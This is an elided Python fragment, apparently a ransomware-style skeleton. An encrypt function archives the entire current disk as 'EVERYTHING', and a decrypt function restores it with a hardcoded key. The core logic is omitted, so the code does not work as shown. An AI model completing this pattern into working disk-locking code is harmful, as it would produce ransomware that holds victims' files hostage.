...
def encrypt(CLIENT_KEY):    
    ...
    zip_all(CURRENT_DISK,"EVERYTHING")
...
def decrypt(CLIENT_KEY):
    ...
    try:
        ...
        unzip_all(CURRENT_DISK,"EVERYTHING.zip")

        cleanup("EVERYTHING.zip")
    except:
...
if __name__ == "__main__":
    k = b"rg9UmrbvkMb1tcBAXscoLMXe-_k4jjdAw46pMfCZy5M="
    decrypt(k)